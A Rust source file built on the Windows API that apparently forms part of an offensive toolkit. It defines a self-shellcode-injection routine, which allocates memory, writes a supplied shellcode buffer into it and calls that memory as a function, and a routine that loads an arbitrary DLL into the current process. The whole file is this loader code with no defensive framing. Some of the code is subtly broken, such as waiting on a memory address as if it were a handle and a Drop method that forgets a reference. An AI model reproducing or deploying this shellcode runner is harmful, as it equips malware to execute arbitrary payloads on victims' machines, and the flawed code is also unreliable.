
use winapi::ctypes::*;
use winapi::shared::minwindef::*;
use winapi::um::errhandlingapi::*;
use winapi::um::libloaderapi::{FreeLibrary, LoadLibraryA};
use winapi::um::memoryapi::*;
use winapi::um::processthreadsapi::*;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winnt::*;

pub struct selfshellcodeinjection{
    prochandle: *mut c_void,
    baseaddress: *mut c_void,

    permissions: u32
}


impl selfshellcodeinjection{

    pub fn inject_shellcode(shellcode:&Vec<u8>,pagepermissions:u32) -> Result<u32,String>{

        let baseaddress = unsafe{VirtualAlloc(std::ptr::null_mut(),shellcode.len(),MEM_RESERVE|MEM_COMMIT, pagepermissions)};

        if baseaddress == std::ptr::null_mut(){
            return Err(format!("VirtualAlloc allocation failed: {}",unsafe{GetLastError()}));
        }

        let mut byteswritten = 0;
        let res = unsafe{WriteProcessMemory(GetCurrentProcess(),baseaddress,
        shellcode.as_ptr() as *const c_void,shellcode.len(),&mut byteswritten)};

        if res==0{
            unsafe{VirtualFree(baseaddress,0,MEM_RELEASE);}
            return Err(format!("WriteProcessMemory failed: {}",unsafe{GetLastError()}));
        }

        let runn = unsafe{std::mem::transmute::<LPVOID,fn()>(baseaddress)};

        runn ();


        Ok(0)


    }


    pub fn inject_shellcode_and_wait(shellcode:&Vec<u8>,pagepermissions:u32) -> Result<u32,String>{

        let baseaddress = unsafe{VirtualAlloc(std::ptr::null_mut(),shellcode.len(),MEM_RESERVE|MEM_COMMIT, pagepermissions)};

        if baseaddress == std::ptr::null_mut(){
            return Err(format!("VirtualAlloc allocation failed: {}",unsafe{GetLastError()}));
        }

        let mut byteswritten = 0;
        let res = unsafe{WriteProcessMemory(GetCurrentProcess(),baseaddress,
                                            shellcode.as_ptr() as *const c_void,shellcode.len(),&mut byteswritten)};

        if res==0{
            unsafe{VirtualFree(baseaddress,0,MEM_RELEASE);}
            return Err(format!("WriteProcessMemory failed: {}",unsafe{GetLastError()}));
        }

        let runn = unsafe{std::mem::transmute::<LPVOID,fn()>(baseaddress)};

        runn ();

        unsafe{WaitForSingleObject(baseaddress,0xFFFFFFFF)};

        Ok(0)


    }

}


impl Drop for selfshellcodeinjection{

    fn drop(&mut self){

        if self.baseaddress != 0 as *mut c_void{
            unsafe{VirtualFree(self.baseaddress,0,MEM_RELEASE);}
        }

    }
}



struct selfdllinjection{
   dllhandle: HMODULE
}

impl selfdllinjection{

    pub fn inject_dll(dllpath:&str) -> Result<Self,String>{

        let mut buffer = dllpath.bytes().collect::<Vec<u8>>();
        buffer.push(b'\0');

        let dllhandle = unsafe{LoadLibraryA(buffer.as_mut_ptr() as *mut i8)};

        if dllhandle.is_null(){
            return Err(format!("LoadLibraryA failed: {}",unsafe{GetLastError()}));


        }



        Ok(Self{ dllhandle})
    }


    pub fn unload_dll(&mut self){
        unsafe{FreeLibrary(self.dllhandle)};
        
    }



}

impl Drop for selfdllinjection{
    fn drop(&mut self){
        std::mem::forget(self);
    }
}